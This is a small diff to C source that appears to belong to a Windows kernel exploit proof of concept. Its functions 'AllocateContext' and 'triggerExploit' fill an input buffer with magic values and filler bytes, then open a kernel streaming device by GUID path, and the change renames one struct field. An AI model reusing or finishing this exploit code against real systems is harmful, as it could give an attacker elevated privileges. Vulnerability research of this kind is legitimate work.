@@ -227,7 +227,7 @@ void AllocateContext() {
 
 	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
 	inbuff.Type = 1;
-	inbuff.Flags = 0x000000136FE7474D;
+	inbuff.Domain = 0x000000136FE7474D;
 	inbuff.val20 = 0x4141414141414141;
 
 	hDevice = CreateFileA("\\\\?\\root#system#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96e080c7-143c-11d1-b40f-00a0c9223196}&{3c0d501a-140b-11d1-b40f-00a0c9223196}", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, 0, NULL);
@@ -289,7 +289,7 @@ void triggerExploit() {
 
 	inbuff.CurrentProcId = (PVOID)GetCurrentProcessId();
 	inbuff.Type = 1;
-	inbuff.Flags = 0x000000136FE7474D;
+	inbuff.Domain = 0x000000136FE7474D;
 	inbuff.val20 = 0x0000000100000001;
 
 	DWORD bytesReturned;
